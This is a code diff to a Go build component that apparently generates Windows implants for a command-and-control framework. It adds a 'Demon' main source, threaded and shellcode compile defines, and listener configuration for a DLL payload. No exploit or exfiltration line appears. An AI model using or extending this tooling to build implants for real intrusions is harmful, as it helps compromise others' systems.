@@ -83,8 +83,9 @@ type Builder struct {
 		Defines     []string
 
 		Main struct {
-			Dll string
-			Exe string
+			Demon string
+			Dll   string
+			Exe   string
 		}
 	}
 
@@ -120,6 +121,7 @@ func NewBuilder(config BuilderConfig) *Builder {
 		"-Wl,-s,--no-seh,--enable-stdcall-fixup",
 	}
 
+	builder.compilerOptions.Main.Demon = "Source/Main/Main.c"
 	builder.compilerOptions.Main.Exe = "Source/Main/MainExe.c"
 	builder.compilerOptions.Main.Dll = "Source/Main/MainDll.c"
 
@@ -196,6 +198,7 @@ func (b *Builder) Build() bool {
 				return false
 			}
 		}
+
 		b.compilerOptions.Config.Compiler64 = abs
 
 		CompileCommand += b.compilerOptions.Config.Compiler64 + " "
@@ -232,6 +235,7 @@ func (b *Builder) Build() bool {
 			}
 		}
 	}
+	CompileCommand += b.compilerOptions.Main.Demon + " "
 
 	// add include directories
 	for _, dir := range b.compilerOptions.IncludeDirs {
@@ -250,7 +254,7 @@ func (b *Builder) Build() bool {
 	switch b.FileType {
 	case FILETYPE_WINDOWS_EXE:
 		logger.Debug("Compile exe")
-		CompileCommand += "-e WinMain "
+		CompileCommand += "-D MAIN_THREADED -e WinMain "
 		CompileCommand += b.compilerOptions.Main.Exe + " "
 		break
 
@@ -272,7 +276,7 @@ func (b *Builder) Build() bool {
 		DllPayload.SetFormat(FILETYPE_WINDOWS_DLL)
 		DllPayload.SetListener(b.config.ListenerType, b.config.ListenerConfig)
 		DllPayload.SetOutputPath("/tmp/" + utils.GenerateID(10) + ".dll")
-		// DllPayload.SetPatchConfig(t.Profile.Config.Demon.Binary.Header)
+		DllPayload.compilerOptions.Defines = append(DllPayload.compilerOptions.Defines, "SHELLCODE")
 
 		b.SendConsoleMessage("Info", "Compiling core dll...")
 		if DllPayload.Build() {
@@ -685,8 +689,6 @@ func (b *Builder) Cmd(cmd string) bool {
 
 	err = Command.Run()
 	if err != nil {
-		path, _ := os.Getwd()
-		logger.Info("Path: " + path)
 		logger.Error("Couldn't compile implant: " + err.Error())
 		if !b.silent {
 			b.SendConsoleMessage("Error", "Couldn't compile implant: "+err.Error())
